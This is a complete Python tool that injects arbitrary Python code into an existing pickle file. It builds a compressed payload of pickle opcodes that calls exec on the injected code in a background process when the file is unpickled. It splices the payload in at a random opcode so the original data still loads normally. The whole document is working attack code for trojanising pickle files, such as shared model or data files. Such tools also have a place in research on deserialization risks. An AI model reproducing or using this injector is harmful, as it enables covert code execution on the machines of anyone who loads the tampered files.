import sys
import pickletools
import tempfile
import os
import random
import zlib
import struct

# Open the files
inf, outf, pos = None, None, None
try:
    inf = open(sys.argv[1],'rb')
    outf = open(sys.argv[2],'wb')
    maliciousPy = open(sys.argv[3], 'rb').read()
except Exception as e:
    print(e)
    print('{} inputFile outputFile pythonFileToInject'.format(sys.argv[0]))
    exit()

# create the payload, the shellcode resolves to this.
# zlib decompress the blob and python exec it.
# the proto at the beginning and end change it to two, and back to what it was
# that just ensures consistancy in case other versions make this less effective.
# 94250272: \x80                                             PROTO      2
# 94250274: c                                                GLOBAL     '__builtin__ exec'
# 94250292: (                                                MARK
# 94250293: c                                                    GLOBAL     'zlib decompress'
# 94250310: (                                                    MARK
# 94250311: B                                                        BINBYTES   b'x\xda\xac...\x80\x12'
# 94282393: t                                                        TUPLE      (MARK at 94250310)
# 94282394: R                                                    REDUCE
# 94282395: t                                                    TUPLE      (MARK at 94250292)
# 94282396: R                                                REDUCE
# 94282397: 0                                                POP
# 94282398: \x80                                             PROTO      4
code = b'from multiprocessing import Process\np = Process(target=exec, args=("""'+maliciousPy+b'""",{"__name__":"__main__"}, ))\np.start()'
data = zlib.compress(code,level=9)
payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')

# dissasemble the target pickle
temp = tempfile.TemporaryFile("w+")
while inf.tell() != os.fstat(inf.fileno()).st_size:
    try:
        pickletools.dis(inf, temp)
    except Exception as e:
        print(e)
        break

# get a list of loctaions and the "highest protocol" from the disassembly
temp.seek(0)
locations = temp.read().split('\n')
temp.seek(0)
version = int(temp.read().partition('highest protocol among opcodes = ')[2].partition('\n')[0])
temp.close()

# append the version so that it is set at the end. the shell code doesn't define what it's being set back to until this point.
payload.append(version)

# pick a random opcode and inject our shellcode before it.
# since pickle opcodes are location independent and our shellcode cleans up the stack, we can inject anywhere and it shouldn't affect a thing.
while pos == None:
    loc = random.choice(locations)
    try:
        pos=int(loc.partition(":")[0])
    except:
        print(loc, 'didn\'t work, trying again')

# simply write the target to the output file up to the injection location, write the shellcode to the output, and then write everything left in the target to the output.
inf.seek(0)
print("injecting at",pos)
outf.write(inf.read(pos))
outf.write(payload)
outf.write(inf.read())
